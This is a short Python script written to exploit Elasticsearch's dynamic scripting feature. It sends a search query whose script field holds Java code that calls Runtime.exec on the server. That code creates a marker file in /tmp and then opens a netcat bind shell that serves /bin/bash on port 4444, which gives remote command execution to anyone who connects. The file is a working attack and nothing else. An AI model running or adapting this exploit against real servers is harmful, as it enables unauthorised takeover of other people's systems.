from datetime import datetime
from elasticsearch import Elasticsearch
import elasticsearch.helpers
import os, sys

host = os.environ.get("HOST") or "localhost"

exploit = """
import java.util.*;
import java.io.*;

Runtime.getRuntime().exec("touch /tmp/exploited");
Runtime.getRuntime().exec("nc.traditional -l -p 4444 -e /bin/bash");
"""

payload = {
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {}
        }
      }
    },
    "script_fields": {
      "run": {
        "script": exploit
	}
   } 
}

#print payload
es = Elasticsearch(host=host)
print es.search(index="_all", body=payload)
